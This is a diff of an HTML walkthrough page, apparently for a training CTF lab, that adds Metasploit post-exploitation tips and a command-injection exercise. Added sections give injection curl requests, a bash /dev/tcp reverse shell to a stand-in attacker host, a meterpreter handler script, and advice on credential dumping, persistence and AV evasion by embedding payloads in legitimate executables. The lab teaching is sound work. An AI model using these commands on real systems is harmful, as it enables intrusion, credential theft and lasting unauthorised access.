@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="description" content="CTF LABS Guide — Official walkthrough for Metasploit Deep Dive Challenge." />
-  <title>CTF LABS — Metasploit Deep Dive Walkthrough</title>
+  <meta name="description" content="CTF LABS Guide — Official walkthrough for the Advanced Metasploit Deep Dive Challenge." />
+  <title>CTF LABS — Advanced Metasploit Walkthrough</title>
   <link rel="stylesheet" href="../../../css/global.css" />
   <link rel="stylesheet" href="../../../css/rules.css" />
   <style>
@@ -46,10 +46,10 @@
     <div style="padding: 60px 0 0; text-align:center;">
       <span class="badge" style="margin-bottom:20px;display:inline-flex;"> Official Walkthrough</span>
       <h1 style="font-size:clamp(40px,5vw,64px);font-weight:900;color:var(--text-primary);letter-spacing:-2px;margin-bottom:14px;">
-        Metasploit Deep Dive <span style="color:var(--accent);">Walkthrough.</span>
+        Advanced Metasploit <span style="color:var(--accent);">Walkthrough.</span>
       </h1>
       <p style="color:var(--text-muted);font-size:17px;max-width:600px;margin:0 auto 8px;">
-        A complete step-by-step walkthrough to help you exploit the target API via command injection.
+        A complete step-by-step walkthrough covering the practical exploitation challenge, including reconnaissance, command chaining, and data exfiltration.
       </p>
     </div>
 
@@ -61,7 +61,9 @@
         <div class="rules-nav-title">Jump to Section</div>
         <ul>
           <li><a href="#intro" class="active" id="nav-intro"> Introduction</a></li>
-          <li><a href="#exploit" id="nav-exploit"> 1. API Exploitation</a></li>
+          <li><a href="#concepts" id="nav-concepts"> 1. Key Concepts</a></li>
+          <li><a href="#exploit" id="nav-exploit"> 2. Practical Exploit</a></li>
+          <li><a href="#advanced" id="nav-advanced"> 3. Advanced Techniques</a></li>
         </ul>
       </aside>
 
@@ -74,12 +76,45 @@
             <div class="block-icon"></div>
             <div>
               <h2>Introduction</h2>
-              <p>How the practical labs work</p>
+              <p>Advanced Metasploit concepts overview</p>
             </div>
           </div>
           <p style="color: var(--text-muted); line-height: 1.6; font-size: 1.05rem;">
-            Welcome to the practical side of CTF LABS! In this lab, you'll be using command injection to extract a flag from the SecureCorp API Portal.
+            Welcome to the Advanced Metasploit Deep Dive! This lab covers post-exploitation with Meterpreter, pivoting & port forwarding, evasion techniques (encoders, packers, custom templates), persistence mechanisms, and resource script automation. The practical challenge uses command injection with multi-stage exploitation.
           </p>
+        </div>
+
+        <!--  Key Concepts  -->
+        <div class="rules-block" id="concepts">
+          <div class="rules-block-header">
+            <div class="block-icon"></div>
+            <div>
+              <h2>Part 1 — Key Advanced Concepts</h2>
+              <p>What you need to know before the practical</p>
+            </div>
+          </div>
+          <ul class="rule-list">
+            <li class="rule-item">
+              <span class="rule-num">1</span>
+              <span class="rule-text"><strong>Meterpreter.</strong> After exploitation, use <code>migrate</code> for stability, <code>getsystem</code> for privilege escalation, <code>hashdump</code> for credential extraction, and <code>load kiwi</code> for Mimikatz capabilities.</span>
+            </li>
+            <li class="rule-item info">
+              <span class="rule-num">2</span>
+              <span class="rule-text"><strong>Post Modules.</strong> Use <code>post/multi/recon/local_exploit_suggester</code> to find escalation paths, and persistence modules like <code>post/linux/manage/sshkey_persistence</code> for maintained access.</span>
+            </li>
+            <li class="rule-item">
+              <span class="rule-num">3</span>
+              <span class="rule-text"><strong>Pivoting.</strong> Use <code>autoroute</code> to add network routes through compromised hosts, <code>portfwd</code> for direct port tunneling, and <code>auxiliary/server/socks_proxy</code> with <code>proxychains</code> for full network pivoting.</span>
+            </li>
+            <li class="rule-item warn">
+              <span class="rule-num">4</span>
+              <span class="rule-text"><strong>Evasion.</strong> Use <code>msfvenom</code> with the <code>-e x86/shikata_ga_nai</code> encoder and <code>-i</code> for multiple encoding iterations. Use <code>-x</code> to embed payloads in legitimate executables and <code>-k</code> to keep the template functional.</span>
+            </li>
+            <li class="rule-item">
+              <span class="rule-num">5</span>
+              <span class="rule-text"><strong>Resource Scripts.</strong> Create <code>.rc</code> files with Metasploit commands for automation. Use <code>makerc</code> to record sessions. Set global variables with <code>setg</code> to persist across modules.</span>
+            </li>
+          </ul>
         </div>
 
         <!--  Exploit Walkthrough  -->
@@ -87,8 +122,8 @@
           <div class="rules-block-header">
             <div class="block-icon"></div>
             <div>
-              <h2>Part 1</h2>
-              <p>API Exploitation via curl</p>
+              <h2>Part 2 — Practical Exploitation</h2>
+              <p>Multi-stage exploitation chain via curl</p>
             </div>
           </div>
 
@@ -99,20 +134,67 @@
             </li>
             <li class="rule-item info">
               <span class="rule-num">Step 2</span>
-              <span class="rule-text"><strong>Discover Endpoint.</strong> In Kali, use curl to visit the target: <div class="code-block">curl http://&lt;TARGET_IP&gt;/</div> This reveals the endpoint <code>/api/diagnostics?cmd=ping</code>.</span>
+              <span class="rule-text"><strong>Reconnaissance.</strong> Enumerate the target — discover the running user and OS:
+                <div class="code-block">curl http://&lt;TARGET_IP&gt;/
+curl "http://&lt;TARGET_IP&gt;/api/diagnostics?cmd=id"
+curl "http://&lt;TARGET_IP&gt;/api/diagnostics?cmd=uname%20-a"</div>
+              </span>
             </li>
             <li class="rule-item">
               <span class="rule-num">Step 3</span>
+              <span class="rule-text"><strong>Enumerate Files.</strong> Explore the file system to locate the flag:
+                <div class="code-block">curl "http://&lt;TARGET_IP&gt;/api/diagnostics?cmd=ls%20/"
+curl "http://&lt;TARGET_IP&gt;/api/diagnostics?cmd=ls%20/etc/"</div>
+              </span>
+            </li>
+            <li class="rule-item">
+              <span class="rule-num">Step 4</span>
               <span class="rule-text">
-                <strong>Test Command Injection.</strong> Inject a command by appending a URL-encoded semicolon (<code>%3B</code>) and the command to read the flag (<code>cat /etc/flag</code>, with a URL-encoded space <code>%20</code>):
-                <div class="code-block">curl "http://&lt;TARGET_IP&gt;/api/diagnostics?cmd=ping%3Bcat%20/etc/flag"</div>
+                <strong>Exploit with Command Chaining.</strong> Use a URL-encoded semicolon (<code>%3B</code>) to chain commands and exfiltrate the flag:
+                <div class="code-block">curl "http://&lt;TARGET_IP&gt;/api/diagnostics?cmd=id%3Bcat%20/etc/flag"</div>
               </span>
             </li>
             <li class="rule-item warn">
-              <span class="rule-num">Step 4</span>
+              <span class="rule-num">Step 5</span>
               <span class="rule-text">
-                <strong>Claim Flag.</strong> The server will execute both the ping and the cat command, returning the flag in the JSON response: <code>FLAG{MSF_D33P_D1V3_M4ST3R}</code>.
+                <strong>Claim Flag.</strong> The server will execute both commands, returning the flag in the JSON response: <code>FLAG{MSF_D33P_D1V3_M4ST3R}</code>.
               </span>
+            </li>
+          </ul>
+        </div>
+
+        <!--  Advanced Techniques  -->
+        <div class="rules-block" id="advanced">
+          <div class="rules-block-header">
+            <div class="block-icon"></div>
+            <div>
+              <h2>Part 3 — Advanced Techniques Reference</h2>
+              <p>Techniques for real-world engagements</p>
+            </div>
+          </div>
+          <ul class="rule-list">
+            <li class="rule-item">
+              <span class="rule-num">Tip 1</span>
+              <span class="rule-text"><strong>Reverse Shell.</strong> After confirming command injection, establish a persistent interactive shell:
+                <div class="code-block">Listener:  nc -lvnp 9999
+Injection: cmd=id%3Bbash%20-c%20'bash%20-i%20>%26%20/dev/tcp/KALI_IP/9999%200>%261'</div>
+              </span>
+            </li>
+            <li class="rule-item info">
+              <span class="rule-num">Tip 2</span>
+              <span class="rule-text"><strong>Multi/Handler Automation.</strong> Create a resource script to automate listener setup:
+                <div class="code-block">use exploit/multi/handler
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+set ExitOnSession false
+exploit -j</div>
+                Save as <code>handler.rc</code> and run with <code>msfconsole -r handler.rc</code>.
+              </span>
+            </li>
+            <li class="rule-item warn">
+              <span class="rule-num">Tip 3</span>
+              <span class="rule-text"><strong>Post-Exploitation.</strong> Once you have a Meterpreter session, immediately <code>migrate</code> to a stable process, run <code>getsystem</code> for privileges, then use <code>post/multi/recon/local_exploit_suggester</code> to find additional escalation paths.</span>
             </li>
           </ul>
         </div>
@@ -123,7 +205,7 @@
 
   <!--  FOOTER  -->
   <footer>
-    <p>© 2026 <a href="../../../index.html">CTF LABS</a> · Internship Project Demo</p>
+    <p>&copy; 2026 <a href="../../../index.html">CTF LABS</a> · Internship Project Demo</p>
   </footer>
 
   <!-- Active sidebar highlighting on scroll -->
